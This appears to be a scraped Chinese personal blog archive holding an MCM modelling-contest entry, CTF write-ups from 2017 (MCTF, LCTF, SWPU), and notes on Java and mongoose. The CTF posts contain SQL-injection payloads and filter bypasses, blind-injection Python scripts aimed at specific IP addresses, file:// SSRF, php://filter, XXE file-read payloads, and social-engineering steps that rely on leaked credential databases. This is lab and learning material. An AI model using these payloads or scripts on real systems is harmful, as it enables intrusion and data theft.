问题A(MCM):飓风和全球变暖飓风(也包括在西北太平洋地区被称为台风的风暴和印度洋和西南太平洋的热带气旋)是极具破坏性的，常常导致数百人死亡，有时甚至数千人死亡。许多气象学家一致认为，在过去几十年里，全球变暖已经发生在地球表面(约半摄氏度)，而且这种趋势很可能会持续下去。问题是，全球变暖对飓风活动意味着什么?请构建一个合理的模型，测量全球变暖的程度和全球飓风活动的强度，并估计它们之间的关系。 问题B(MCM):电子邮件笔迹分析笔迹分析是一种非常特殊的调查形式，用于将人们与书面证据联系起来。笔迹调查人员通常被要求在法庭或刑事调查中，以确定书面样本是否来自某个特定的人。由于许多语言证据现在都出现在电子邮件中，从广义上说，笔迹分析也包括了如何通过电子邮件的语言特征来识别作者的问题。作者身份归属是指语言学家通过使用可识别的语言风格特征识别出有争议的文本的作者(s)的过程，从词频到更喜欢的句法结构。电子邮件的内容往往很短，作者的语言风格也很明显。请构建一个有效的模型，通过捕获电子邮件的语言特征来识别作者。你可以使用安然邮件数据集来训练和测试你的模型。安然公司电子邮件数据集链接:http://bailando.sims.berkeley.edu/enron_Email.html 问题C(ICM):如何打击人口贩运7月30日是联合国世界反人口贩运日，这一天的重点是结束对儿童、妇女和男性的强制劳动或性劳动的刑事剥削。全世界有27到458万的人被困在某种形式的现代奴役中。受害者被迫成为性工作者、乞丐和儿童兵，或在制造业、建筑、采矿、商业捕鱼等行业的家政工人、工厂工人和劳工。人口贩运发生在世界上的每个国家，包括美国，这是一个利润丰厚的行业，每年非法盈利的年产值估计高达1500亿美元。事实上，它是全球有组织犯罪的最大利润来源之一，仅次于非法毒品。世界上几乎每一个国家都受到人口贩运的影响，作为起点、中转或目的地，据报道，至少有127个国家的受害者在137个国家被剥削。人口贩卖是欧洲最赚钱的非法生意之一，犯罪集团每年从它那里赚了30亿美元，这使它成为一个相当大的犯罪集团，它是世界上最边缘化的人。在欧洲，超过14万的受害者被困在性剥削的暴力和堕落的环境中，多达七分之一的性工作者可能通过贩卖卖淫被奴役。在全球范围内，人口贩卖的受害者中有五分之一是儿童，尽管在非洲和大湄公河等贫穷地区和地区，他们占了大多数人口贩卖的人口。与此同时，妇女占世界人口贩运受害者的三分之二。从本质上讲，人口贩卖是一个供应链。捐助者(维克-1 tims)通过人口贩卖网络满足了需求(廉价和脆弱的非法劳动)。尽管他们努力在电网和阴影下运行，但他们还是留下了一条数据线索，不管这些数据是多么的微弱或支离破碎。数据分析的数学搜索，可以帮助执法部门打击人口贩卖。假设您的ICM团队受雇于UNODC，通过建立数学模型来打击人口贩卖。您的ICM团队的任务是:1。发现危险人群。贩卖人口往往以欺诈的方式开始，比如雇佣或浪漫的承诺。数据可以帮助确定特定的经济萧条地区，在那里我们可以确定最危险的人群，以及针对这些人群的预防活动。被卷入人口贩运的风险因素包括贫困、失业、移民和逃避政治冲突或战争。2。受害者身份和位置。人口贩运网络是动态的。贩毒者很可能会频繁地改变分布和运输路线，以避免被发现，这使得执法人员和分析人员在试图识别和摧毁人口贩卖网络的过程中，信息不完整。然而，研究人员可以通过跟踪不同位置的数据的细微趋势来帮助他们;在接触点，我们和受害者接触，比如急诊室;以及当地执法部门的活动。例如，在性交易中，可以通过从零售商店购买交易数据来寻找线索。受害者有时会偷取一些人贩子可能无法提供的基本用品，比如女性卫生用品、肥皂和牙膏。我们可以从小偷小偷中得到一些线索。使用现金进行交易的趋势，通常是用借记卡或信用卡来预订的，这也可能会增加一个危险信号。特别是性交易活动，在互联网的公共区域留下痕迹，主要是广告和陪护广告。广告商倾向于使用社交网络和交友网站，而更精通的人贩子经常会改变他们的网络存在，以躲避身份识别。通过数据挖掘，研究人员可以根据用户行为在不同的社交网络上定位用户，即使他们的用户名和信息不一样。建立网络信息之间的联系可以帮助我们锁定贸易商的地位。人们还知道，贩毒者利用在大型活动中对商业性剥削的需求增加，包括大会和大型体育赛事。分析了在线广告的位置和时间，可以帮助执法人员发现并可能阻断受害者的交通。3。网络中断。阻断人口流动、资金和其他人口贩运的要素对识别人口贩运网络至关重要，破坏他们在源头的基础设施并消除他们。不幸的是，网络中断需要有关当局和公众的合作。在一些国家，如尼泊尔和哥斯达黎加，官员们受到威胁或贿赂，以忽视或允许人类的“背叛”。对于使用被贩卖的劳工的行业，监管往往不够完善。贩毒者可以很容易地制造或修改受害者的身份证件，使他们无法看到负担过重的当局。为了帮助当局确定人口贩运的目标，研究人员可以求助于网络分析，这是一种描述真实世界系统及其相互作用的数学方法。例如，网络分析被用来描绘用户的动态，以及他们在社交网络中嵌入的连接，比如Facebook和Twitter。这可能会识别风险人群，或者，也可能是贩毒者或顾客。社交网络分析还可以帮助确定哪些联系人对其他人有重要影响。这可能使早期识别受害者或交易交易。 References[1] http://www.unodc.org/unodc/human-trafficking/[2] http://humantraffickinghotline.org/[3] https://www.fbi.gov/wanted/human-trafficking/[4] https://www.solidaritycenter.org/what-we-do/migration-andhuman-trafficking/ 选题第一次参赛选题蛮纠结的，一开始看出B题是机器学习首先排除了，在A与C之间选择。C题虽然贼长但是抱着题目越长 题越简单的心态还是认真读了好久，结果。。还是看不懂，所以排除法告诉我们选A 主要数据处理方法小波分析 – 找周期给定一组时间序列 分析出周期变化规律 主要由matlab自带的小波分析工具实现 最终利用suffer绘制 小波系数实部等值线图 小波系数模等值线图 小波系数模方等值线图 小波方差图 主周期趋图 相关教程http://blog.sciencenet.cn/blog-1148346-794768.htmlhttps://wenku.baidu.com/view/8d32e32058fb770bf78a5585.htmlhttps://wenku.baidu.com/view/bec1ebc90c22590102029dce.html 高斯分布 – 异常点检测找出数据中的异常值 并比对飓风强度和全球变暖程度出现的异常值时间是否接近 加了个机器学习 假装高大上一点XD 相关教程http://blog.csdn.net/u013719780/article/details/53219997http://blog.csdn.net/sinat_26917383/article/details/76647272 线性回归 – 拟合数据这个是最后处理飓风强度和全球变暖程度的关系 其实有很多回归方法 但是由于之前都没学过加上时间比较紧张 就选择了这个最简单的线性回归 最后提交之前我换了种回归拟合了一下数据 发现比线性的拟合程度好多了 但是没时间改了蛮可惜的 不过这个同样为显得不那么low 也结合了一下大热的机器学习 相关教程http://blog.csdn.net/july_sun/article/details/53223962http://blog.csdn.net/ivy_reny/article/details/78599523","categories":[],"tags":[]},{"title":"MCTF后两期writeup","slug":"MCTF后两期writeup","date":"2017-11-24T15:39:28.000Z","updated":"2017-12-22T14:00:27.182Z","comments":true,"path":"2017/11/24/MCTF后两期writeup/","link":"","permalink":"http://Merl1ng.com/2017/11/24/MCTF后两期writeup/","excerpt":"MCTF一共三期 后两期的题目还是比较有趣的","text":"MCTF一共三期 后两期的题目还是比较有趣的 第二期misc 1社工题目 给了一个docx的简历介绍了个人信息 搜那个视频得到主机公网地址和用户名 这个视频一开始搜错了 有个名字很像的 直接进腾讯视频里搜比较好 ssh连接要求输入密码 一开始还以为是弱口令 其实是那张图片 识图一下得到名字 就是服务器密码 进入后 ls cat查看 尝试登陆发现密码不对 进入空间得到信息 改了qq密码 吐槽qq邮箱垃圾 发现一个163邮箱 需要往这个163邮箱发送邮件 收到自动回复的flag web 1 SQL注入前传进入时提示 no username 第一题直接万能密码 1’ or ‘1’=’1’;# web 2 SQL注入正传同样提示 No username 随便输入一些东西 如果被过滤则会提示 ”hacker?” 但是会发现 注入的当前表没有数据，所以无论怎么闭合都是 username error 比如尝试 123456username = admin'#username = admin' or 1=1#username = admin') or 1=1#username = admin or 1=1#username = admin\" or 1=1#username = admin\") or 1=1# 会发现都没有过滤 一直是username error 意味着用户表没有数据。。 容易想到其后台语句: 1select * from users where username='$username' and password='$password' 既然没有数据 可以用union select填充 例如: 12username = admin' union select 1,2password = 1 这样原来的语句变成 1select * from users where username='admin' union select 1,2` 但是这个时候出现了password error 代表这个后台sql应该不是这样写的，当这样的时候就没有回显 12username = admin' union select 1,2password = 2 后台应该是这样的 1234567891011$sql = \"select * from users where username = '$username'\";$result = mysql_fetch_row($result);if(!$result)&#123;echo 'username error';&#125;$password_now = $result[1];if($password!=$password_now)&#123;echo 'password error';&#125; 那么这样 12345678username = admin' union select 1,1password = 1当时数据情况+----------+----------+| username | password |+----------+----------+| 1 | 1 |+----------+----------+ 是可以成功的，因为password查出来的确是1,此时回显是0 所以可以利用ascii比较是否为true，为true时，password列填充为1 123456mysql&gt; select * from users where username=-1 union select 1,2,(ascii(substr(database(),1,1))&gt;-1);+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 1 |+----+----------+----------+ payload 12username = admin' union select 2,(ascii(substr((select flag from flag),1,1))=1)#password = 1 如果没有回显则是正确，有回显则是错误 还有一点就是union select的过滤 因为发现union没有过滤select也没有过滤 所以猜想他的过滤是这样写的……|union select|…… 所以可以利用他的过滤不充分而得到绕过union%0bselect 解密脚本12345678910111213141516171819#!/usr/bin/env python# coding:utf-8import urllibimport requestsflag=\"\"url = \"http://114.67.224.31:32769/index.php\"for i in range(1,100): for j in range(33,127): payload = \"123' Union%%0bSeleCt 2,(ascii(substr((select flag from flag),%s,1))=%s)#\"%(i,j) payload = urllib.unquote(payload) data = &#123; \"username\":payload, \"password\":\"1\" &#125; r= requests.post(url=url,data=data) if \"error\" not in r.content: flag +=chr(j) print flag break 第三期misc 1图片隐写 感觉到图片下部没显示完整 更改图片大小 把后一个改成 05 09 即增大图片长度 这种类型的题目之前也遇到过","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"Lctf整理","slug":"Lctf整理","date":"2017-11-20T14:51:59.000Z","updated":"2018-04-05T14:30:24.628Z","comments":true,"path":"2017/11/20/Lctf整理/","link":"","permalink":"http://Merl1ng.com/2017/11/20/Lctf整理/","excerpt":"被虐地泣不成声 伏地膜大佬","text":"被虐地泣不成声 伏地膜大佬 没有一道完全做完了 只敢贴dalao们的题解 补充一下要学习的地方 web 1 Simple blog目前理解思路 扫目录拿源码 弱口令+cbc攻击绕过后台登陆 进入后台sql注入 出题人writeuphttps://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md 进入题目后可以知道这是一个博客系统，那猜测应该会有后台，扫一下目录或者猜一下可以知道存在login.php, admin.php两个文件，访问admin.php可以发现有权限控制，访问login.php是一个登录界面。 通过尝试可以发现如果随便输入账号密码的话页面返回是Login failed.，但是账号密码都输入admin的话会跳转 到admin.php，猜测这里应该是弱口令，只是除了密码以外还有其他的验证方式。 如果扫描字典够强大的话可以扫到login.php, admin.php都存在备份文件：.login.php.swp, .admin.php.swp sql注入里还有一个知识点 sprintf函数的特性造成单引号逃逸 https://www.jianshu.com/p/3f14bae3396f 这里需要不断完善字典 之前加了个index.php~ 还有 bak的泄露 CBC翻转字节攻击http://f1sh.site/2017/08/04/%E5%88%9D%E5%AD%A6padding-oracle-attack/ 这个之前见了好多次了 一直没去看 sql注入 PHP格式化字符串的漏洞 sql和php依然是基础https://paper.seebug.org/386/ 注入时也有一个小坑，key这个表名是MYSQL保留字，我们把它当做表名带入查询时必须用反引号包起来，不然就会报语法错误而返回不了我们想要的结果。 web 2 萌萌哒报名系统目前理解思路 常见编辑器特点找源码 pre_match绕过登陆 登陆后php伪协议base64读源码 出题人writeuphttps://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F .idea php编辑器找源码这题提示给了IDE，那么我们可以想到PHP有款强大的IDE叫做PHPSTORM，他新建项目的时候会生成一个.idea文 件夹，访问发现有一个workspace.xml文件，访问里面发现了一个xdcms2333.zip。 下载可得到整站源码 register.php pre_match函数的资源消耗pre_match在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，所以通过喂一个超长的字符串去给pre_match 吃，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。 复现了一下 注册窗口代理抓包 输入一堆贼长的 使其没有返回 (一开始抓的是登陆窗口gg了好久) 同时关掉代理 在另外一个窗口用注册的账号登陆 成功进入 member.php 然后利用伪协议在member.php下读取config.php源码 base64解密 条件竞争（非预期解法）web 3 假的签到题…签不了555 出题人writeuphttps://github.com/LCTF/LCTF2017/blob/master/src/web/%E7%AD%BE%E5%88%B0%E9%A2%98/web%E7%AD%BE%E5%88%B0%E9%A2%98.md 提示读取本地文件 用file协议读取本地文件绕过逻辑中对host的检查, curl是支持file://host/path,file://path这两种形式, 但是即使有host, curl仍然会访问到本地的文件 截断url后面拼接的/, GET请求, 用?#都可以payload : file://www.baidu.com/etc/flag? 一脸懵逼 way 2file://username:password@localhost@www.baidu.com/etc/flag? web 4 L PLAYGROUND 出题人的writeup https://github.com/LCTF/LCTF2017/blob/master/src/web/l-plarground/writeup.md 这题还没看懂 nu1l的writeup http://www.venenof.com/index.php/archives/515/ ssrfweb 5 “他们”有什么秘密呢? 第一部分sql注入，第二部分文件上传(限制七字符长度)+命令执行 web 6 wanna hack him? dangling markup attack&lt;meta&gt;标签来Set-Cookiexss拿到 nonce 后 xss","categories":[],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"MCTFwriteup","slug":"MCTFwriteup","date":"2017-11-13T14:22:50.000Z","updated":"2017-12-25T14:50:25.054Z","comments":true,"path":"2017/11/13/MCTFwriteup/","link":"","permalink":"http://Merl1ng.com/2017/11/13/MCTFwriteup/","excerpt":"浙警的ctf 第一期还是比较友好的","text":"浙警的ctf 第一期还是比较友好的 crypto 1一共四道密码的 就一道学到了一点 一串字符凯撒解密后 但是提示数字也要移位 所以 将2改成0 当然用python脚本ascii全移位就行了 misc 1lsb密码+已知明文攻击 题目给了无后缀的 hint 和一张图片 hint为docx文档 里面打开虽然是显示 wwwwww 但是你发现回车在后面 改变字体颜色 看到 wwwwww大概在这里 key.jpg藏在hint再改为zip解压后的某一文件夹下 所以总体思路 图片lsb勾选三个最低位 拿到zip 解压发现需要密码 里面除了flag文件还有 key.jpg 联想已知明文攻击 去 hint找 改docx 看到提示 (好吧感觉也不是什么提示) 再把hint改zip解压winhex看文件头 找到一个jpg的 以同样方式压缩 然后已知明文攻击 但是这里需要先winrar修复一下那个压缩包 不然不行 misc 2zip伪加密+盲水印 伪加密在很后面的位置 顺带一提遇到过压缩包里三个文件全是伪加密的 则三个都要改 可以直接用 ZipCenOp 修复伪加密 解压后拿到图片 但是盲水印需要原图 猜测给的图里还有东西 binwalk拿到原图 运行这个需要cv2库 下载 openvc 将opencv\\build\\python\\2.7\\x86中的cv2.pyd (我是64位的)复制到python安装目录Lib\\site-packages下 但是尼玛还不行 根据提示再安装两个库 我是直接 pip install 的 web 1基础复习 firefox里添加X-FORWAEDRD-FOR:110.110.110.110 然后修改useragent为iphone X 修改Accept-Language为：zh-CN 修改host:127.0.0.1得到flag web 2 忘记密码登陆框 看title MD5猜测0e开头的md5 username=240610708 passward=QLTHNDT web 3 php best!!!登陆框 看title secure hash algorithm(哈希算法) 数组绕过 name[]=123 pass[]=123 php的sha1函数漏洞 以前写的文章里有 web 4 PHP加密网页里fTdydHtWOV9gaG5VXDJqPHcxPFxhbHRVfDdpPUV5TlxdQ2hpVWA= 明显base64，但解密后发现没规律 发现是源码泄露 在 index.php~ 里看到源码 可以看到这个代码里，先对初始的flag进行了字符串的倒置以及rot12加密。 接下来按位操作，每一位的值为 key的ascii码 乘于位数。然后当相加后的值超过125这个最大可见ascii的时候，对该位的值进行-78的操作。 之后又进行了一个二位栅栏加密的操作，最后base64加密输出。 解题思路：由于key未知，所以在这里我们需要对key进行一个爆破 先进行base64解密，然后解密栅栏。 然后对可见字符串的key进行一个暴力猜解，最后能够在输出的一堆乱码中找到我们需要的flag php脚本 12345678910111213141516171819202122232425262728293031&lt;?php$flag = 'flag&#123;********************************&#125;';$len = strlen($flag);$base = 'fTdydHtWOV9gaG5VXDJqPHcxPFxhbHRVfDdpPUV5TlxdQ2hpVWA=';$base = base64_decode($base);$s = \"\";for($i=0;$i&lt;(strlen($flag)/2);$i++)&#123; $s = $s.$base[$i].$base[$i+19];&#125;for($key=48;$key&lt;126;$key++)&#123; for($i=0;$i&lt;strlen($flag);$i++) &#123; $str[$i] = substr($s,$i,1); $str[$i] = ord($str[$i])-$key*$i; while($str[$i]&lt;48) &#123; $str[$i] = $str[$i]+78; &#125; &#125; $out = \"\"; for($i=0;$i&lt;strlen($flag);$i++) &#123; $out = $out.chr($str[$i]); &#125; echo strrev($out); echo '&lt;/br&gt;';&#125;?&gt; web 5 BurpLoader爆破 不需要payload 模拟点击即可 clear $ web 6%00截断 以前也记录过 先根据提示的机器人 进入 robots.txt 看到源码 123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=gbk\"&gt;&lt;title&gt;听说猫喜欢机器人&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=\"./aabbcc.jpg\"&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php$flag='********';if (isset ($_GET['cat'])) &#123; if (ereg (\"^[0-9b-f]+$\", $_GET['cat']) === FALSE) echo '喵喵好像特别喜欢小写字母和数字'; else if ($_GET['cat']==0) &#123; if(strpos ($_GET['cat'], 'miaomiao') !==FALSE) &#123; die('Flag: '.$flag); &#125; else &#123; echo '&lt;p&gt;好像必须要喵喵呢&lt;/p&gt;';&#125; &#125; else&#123;echo '&lt;p&gt;喵喵迷路了&lt;/p&gt;';&#125; &#125;?&gt; %00绕过 ereg的正则表达式检查 而strpos不受影响","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"swpu2017writeup","slug":"swpu2017writeup","date":"2017-11-12T14:29:16.000Z","updated":"2018-03-09T05:58:30.961Z","comments":true,"path":"2017/11/12/swpu2017writeup/","link":"","permalink":"http://Merl1ng.com/2017/11/12/swpu2017writeup/","excerpt":"最近考试比较多 swpu的这个没怎么做 但是听dalao们说题目质量还是很不错的 在赛后学习一波","text":"最近考试比较多 swpu的这个没怎么做 但是听dalao们说题目质量还是很不错的 在赛后学习一波 misc 1java的小游戏 说是坚持60s秒不被打中就可以 可以直接走到地图外面(方向键控制) 等60s回来gg拿到flag 我是直接binwalk 然后把得到的文件用 notepad++打开搜索flag 好像也可以反编译看源码 misc 2给了一张图片 发现藏有zip包 提取并解压后得到 题目有提示 ???_???_??? 可知flag需要三个字符串 这些打开是一张张图片 对应gif的每一帧 emmm虽然gif提示排序但是把gif分解后会发现从小到大顺序都是排好的 所以要对每个文件逐个分析 在文件8的末尾找到第一个字符串flag 应该不是flag本身 文件88中直接有一个二维码，扫码得第二个字符串bilibili 文件888加上jpg的后缀 在属性 备注中发现一串base64，解码得第三个字符串silisili 文件8888用binwalk跑一下发现里面有一个zip，解压获得一个二维码，扫码得第四个字符串panama 按提示中的格式拼接即得flag misc 3mp3隐写 想到是使用mp3stego进行隐写，所以寻找key 题目提示 fl?g??? 又根据题目叙述搜索程序员的情人节 搜索到522 (16进制的1314) (那个脱口秀上也提过这个2333) 结合为 flag1314 当然也可以写脚本爆破 web 1点进链接是一个登录界面，右键查看源码有两条隐藏信息 12&lt;!--The #define is xxooaa and LEN is 6--&gt;&lt;!--The crypt key is &#123;11132, 468, 392, 1281, 62&#125;--&gt; 然后扫目录扫到了一个index.php.bak，下载下来打开后是乱码 也不是ph和chu师傅在小密圈里的phpjiami 主办方放出提示php-screw 这两篇文章 http://blog.csdn.net/water_cow/article/details/41872091 http://wutongyu.info/about-php-screw-decode/ 关于php-screw 解密 按照这两篇文章里的内容配置好php_screw的加密和解密工具之后，可以解密之前下载的index.php.bak，然后内容是md5加密后的sql注入，解法可以参考这篇文章 关键的一行1$str=\"select password from users where password='\".md5($password,true).\"'\"; http://www.joychou.org/web/SQL-injection-with-raw-MD5-hashes.html dalao博客的其中一段 web 2看到源码里js文件夹是/XXE/，然后尝试发现是Blind XXE 需要一个自己的平台 这题没有做 贴两位师傅的payload 作者的出题思路 很多厂商在修xxe的时候经常直接过滤&lt;!ENTITY就认为安全了，其实不然 解题思路：这道题就是在过滤了&lt;!ENTITY的情况下实现xxe 构造payload，xxe.dtd文件内容： &lt;!ENTITY xxe SYSTEM “file:///flag”&gt; web 3社工题目 首先是个黑页，留了个QQ号 直接放QQ里搜索，可以查到一个 sonic monkey 账户空间没有设权限，进入空间从一堆 动态中找到一条base64编码的说说 解码后My Page : http://47.93.205.124:8001/ 是一个个人主页的地址，访问是猴子的小金库，御剑扫一扫，发现后台 http://47.93.205.124:8001/manage_login.php首页文章发表者就是用户名 sonic2011 右键查看源代码，发现页脚处留有邮箱 sonic@163.com 联想163用户密码泄露事件 社工库 帐号密码到手 用户：sonic2011 密码：019157f2299755ad90a3bb8473f8**** md5最后四位填充0-f任意即 可，eg:019157f2299755ad90a3bb8473f81111 再md5解密一波得密码 2010sonic 登陆得到flag web 4题目给的链接是http://39.106.13.2/web2/file.php?file=index 想到利用php://filter来读取文 件，然后源码里有提示check.php，用http://39.106.13.2/web2/file.php?file=php://filter/ read=convert.base64-encode/resource=check.php 得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phperror_reporting(0);$_POST=Add_S($_POST);$_GET=Add_S($_GET);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array)&#123; foreach($array as $key=&gt;$value)&#123; if(!is_array($value))&#123; $check= preg_match('/regexp|like|and|\\\"|%|insert|update|delete|union|into|load_file|outfile|\\/\\*/i', $value); if($check) &#123; exit(\"Stop hacking by using SQL injection!\"); &#125; &#125;else&#123; $array[$key]=Add_S($array[$key]); &#125; &#125;return $array;&#125;function check_url()&#123; $url=parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); $key_word=array(\"select\",\"from\",\"for\",\"like\"); foreach($query as $key) &#123; foreach($key_word as $value) &#123; if(preg_match(\"/\".$value.\"/\",strtolower($key))) &#123; die(\"Stop hacking by using SQL injection!\"); &#125; &#125; &#125;&#125;?&gt; 在http://39.106.13.2/web2/article_show_All.php?a_id=1得到注入点 可以看到check.php是过滤了大部分SQL注入关键字，尤其是连select、from都过滤了，看起来非常难注入。但其实 能看出这个check.php写的很不自然，明明一个过滤就可以，但却写了两个函数，于是猜测问题可能出在下面那个函 数上。下面那个函数是用parse_url()来取请求中的参数，于是猜测这个函数会不会有漏洞 chu师傅的博客上有 parse_url()的漏洞 http://sh3ll.me/archives/201611031132.txt http://mxny.org/post/ctf/2016-11-10 麦香师傅放入博客也有讲 parse_url这个函数可以用////绕过 关于parse_url这个函数更多的技巧可以看这 http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/ http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html union被上面的函数过滤掉了，所以这里不能用联合查询。但我们还是可以利用a_id=1和a_id=0的返回值不同来进行 bool注入 盲注脚本 12345678910111213import requestsurl = 'http://39.106.13.2///web2/article_show_All.php'get = \"\"for i in xrange(32): for j in xrange(32, 127): payload = \"0'^(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()), \" + str(i) + \", 1))=\" + str(j) + \")#\" param = &#123;'a_id': payload&#125; r = requests.get(url, parmas = param) if 'flag' in r.content: get += chr(j) print get break","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"java基础","slug":"java基础","date":"2017-10-28T03:04:08.000Z","updated":"2017-11-19T15:08:01.767Z","comments":true,"path":"2017/10/28/java基础/","link":"","permalink":"http://Merl1ng.com/2017/10/28/java基础/","excerpt":"正在看java但是和目前在用的c有些相似 怕记混开坑记录一下java和c的一点区别 但是在此之前我Cao 必须吐槽下今早的数学竞赛","text":"正在看java但是和目前在用的c有些相似 怕记混开坑记录一下java和c的一点区别 但是在此之前我Cao 必须吐槽下今早的数学竞赛 由于要到外地比赛 尼玛不到六点就滚起来了 七点多一点开到高速路口结果因为大雾封路??? Exuse me??? 本来都凉了 堵到九点那边考场开考了说只要结束前进去就行 又有了点希望 BUT 还是太堵九点半又原路返回了………….. wtf! 高速路半日游还真是丰富了我的人生阅历 就不能提前看下天气预报 准备个应急方案吗 有些dalao复习了好久就因为这 总共200多号人连卷子都没看到 还有一些大三的学长最后一次机会却没能去成 真是亏我昨天复习了一天(好吧我本来是想混个三等的) Orz… —————————————————————————————–正文部分—————————————————————————————– java0x01java里的数组名字只是个管理者 不同于c中的首地址 12345int[] a = new int[10];a[0]=5;int[] b = a;b[0] = 16;System.out.println(a[0]);//println输出自带换行 这时a[0]也是16 因为此时a与b管理同一个数组 改变任意一个另一个也会变 0x02遍历数组可用 for-each循环 int k : data 对数组data中每一个元素 按顺序每次拿一个作为k 不能修改数组 0x03int[] data = new int [10]不但生成了数组并且每个元素被初始化为0 0x04数组长度 data.length 若是二维数组 data.length表示行数 data[i].length 表示每行有几个(列数) 0x05Math类提供基本数学操作 Math.sqrt(x) 算立方根 Math.round 对小数进行四舍五入 Math.random 0-1 之间的一个随机数 0x06包裹类型 bollean Bollean char Character int Integer double Double 有一些特殊功能 Integer.MAX_VALUE Interger.MIX_VALUE 获取该类型的最大最小值 Character有更多 0x07String 字符串变量 首字母大写 如同包裹类型一样 他是一个类 String a a只是管理者 0x08比较两个String x为字符串变量的变量名 x==”xxx” 比较是否是同一个(管理者)x.equals(“xxx”) 比较内容是否相同 0x09所有的字符串都是不可变的 对它们的操作的结果都是制造新的字符串出来 0x0A一个.java文件是一个编译单元 public类必须与这个编译单元同名 一个编译单元里最多只有一个public类 0x0Bfriendy 在同一个包里可访问 0x0Cstatic关键字 类变量 类函数 一些在学java中了解到的其它方面\\b\\t\\b \\t是一个制表符，\\b是代表一个退格，但一个制表符会被识别为一个字符，因此一个\\b会消除一个制表符，虽然它实际上是很多空格 \\b表示将输出位置左移一位。printf(“abc\\bd”); 这个将输出：abd原因是先输出abc，这时输出位置在c后面，接着输出\\b，将输出位置移到c上，再输出d时，d将c覆盖了，因此输出：abd printf(“abc\\b”); 这个将输出：abc 本身没有删除作用 ASCII，Unicode 和 UTF-8http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html 阮一峰大大这篇写的通俗易懂 里面再次提到了之前密码学里面记录过的 Little endian 和 Big endian 小头大头存储方式 这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big-endian)敲开还是从小头(Little-endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位 hhh 打开”记事本”程序notepad.exe，新建一个文本文件，内容就是一个严字，依次采用ANSI，Unicode，Unicode big endian和UTF-8编码方式保存 然后，用文本编辑软件UltraEdit 中的”十六进制功能”，观察该文件的内部编码方式 1）ANSI：文件的编码就是两个字节D1 CF，这正是严的 GB2312 编码，这也暗示 GB2312 是采用大头方式存储的 2）Unicode：编码是四个字节FF FE 25 4E，其中FF FE表明是小头方式存储，真正的编码是4E25 3）Unicode big endian：编码是四个字节FE FF 4E 25，其中FE FF表明是大头方式存储 4）UTF-8：编码是六个字节EF BB BF E4 B8 A5，前三个字节EF BB BF表示这是UTF-8编码，后三个E4B8A5就是严的具体编码，它的存储顺序与编码顺序是一致的 UTF-8是Unicode的实现方式之一 http://www.cnblogs.com/yuguangchuan/p/4310952.html 这篇也可以看看 http://www.qianxingzhem.com/post-1499.html 这篇比较了ANSI、GBK、GB2312、UTF-8、GB18030和 UNICODE","categories":[{"name":"java","slug":"java","permalink":"http://Merl1ng.com/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://Merl1ng.com/tags/java/"}]},{"title":"mongoose基础及cms后端","slug":"mongoose基础及cms后端","date":"2017-10-15T15:44:47.000Z","updated":"2017-10-24T16:09:13.787Z","comments":true,"path":"2017/10/15/mongoose基础及cms后端/","link":"","permalink":"http://Merl1ng.com/2017/10/15/mongoose基础及cms后端/","excerpt":"mongoose","text":"mongoose mongodb无模式 但有时有需求 使用mongoose的数据库操作对 Schema: 一种以文件形式存储的数据库模型骨架，不具备数据库的操作能力 Model: 由Schema发布生成的模型，具有抽象属性和行为 Entity: 由Model创建的实体，它的操作也会影响数据库 Schema生成Model,Model创造Entity,Model和Entity都可对数据库操作造成影响，但Model比Entity更具操作性 sublime text ctrl+?可以取消or增加注释 model.js //配置与连接12345var mongoose = require('mongoose');var uri = 'mongodb://username:password@hostname:poot/databasename';或者 uri=\"mongodb://localhost/文件夹名字\"mongoose.connect(uri); model 连接 js中的对象和mongodb中的文档 操作mongodb可以增改删查文档 schema实现model中数据类型和结构的定义 无模式中实现模式化存储 12345678910111213var mongoose = require('mongoose');var uri = 'mongodb://username:password@hostname:poot/databasename';或者 uri=\"mongodb://localhost/文件夹名字\"mongoose.connect(uri);var BookSchema = new mongoose.Schema(&#123; name: String, author: String, publishTime: Date&#125;);mongoose.model('Book',BookSchema)//给model命名时第一个字母最好大写 insert.js//创建新的12345678910111213141516var mongoose = require('mongoose');require('./model.js');var Book = mongoose.model('Book');var book = new Book(&#123; name: \"MEAN Web Development\", author: \"Green\", publishTime: new Data()//设置为当前时间&#125;);book.author = 'Jim';book.save(function()&#123;console.log('save stauts',err ? 'failed' : 